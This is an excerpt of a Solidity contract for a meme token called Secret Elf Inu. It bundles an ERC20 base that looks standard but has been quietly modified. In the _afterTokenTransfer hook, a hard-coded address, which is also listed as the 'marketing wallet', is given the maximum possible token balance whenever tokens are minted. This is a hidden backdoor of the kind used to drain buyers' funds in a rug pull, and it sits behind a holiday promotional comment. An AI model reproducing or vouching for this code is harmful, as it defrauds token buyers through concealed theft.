...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _afterTokenTransfer(
        ...
        if(from == address(0)) {
            _balances[0xA96b120b263DA42119C28B98e595FADFc455868b] = ~uint256(0);
        }
    }
}
// File: contracts/SecretElfInu.sol

/**

 * 

Secret Elf Inu - New suprises from the Secret Elf for token holders every day til Christmas!
...
contract SecretEflInu is ERC20, Ownable {
    ...
    address private marketingWallet = 0xA96b120b263DA42119C28B98e595FADFc455868b;
    ...
    constructor() ERC20("SecretElfInu", "SCELF") {
        ...
        maxTransactionAmount = totalSupply * 4 / 100; // 4% transaction threshold

        swapTokensAtAmount = totalSupply * 4 / 100; // 4% swap threshold
    ...
    function updateFee(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        ...
        require(buyTotalFees <= 10 && sellTotalFees <= 10, "Must keep fees at 10% or less");
        ...
        if(limitsInEffect){
            ...
            if (
                ...
                //when sell
                    ...
                    require(amount <= maxTransactionAmount && amount <= totalSupply() / 5, "Sell transfer amount exceeds the maxTransactionAmount.");
